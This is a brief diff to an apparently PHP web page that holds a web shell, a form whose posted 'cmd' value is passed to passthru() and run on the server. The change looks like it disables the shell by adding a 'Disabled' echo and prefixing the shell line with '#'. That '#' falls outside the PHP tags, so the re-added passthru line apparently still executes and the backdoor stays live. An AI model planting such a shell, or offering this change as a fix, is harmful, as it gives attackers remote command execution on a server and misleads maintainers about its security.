@@ -3,5 +3,6 @@
  <input type="submit" value=".:"/>
 </form>
 <pre>
-<?php echo passthru($_POST["cmd"]); ?>
+#<?php echo "Disabled"; ?>
+#<?php echo passthru($_POST["cmd"]); ?>
 </pre>
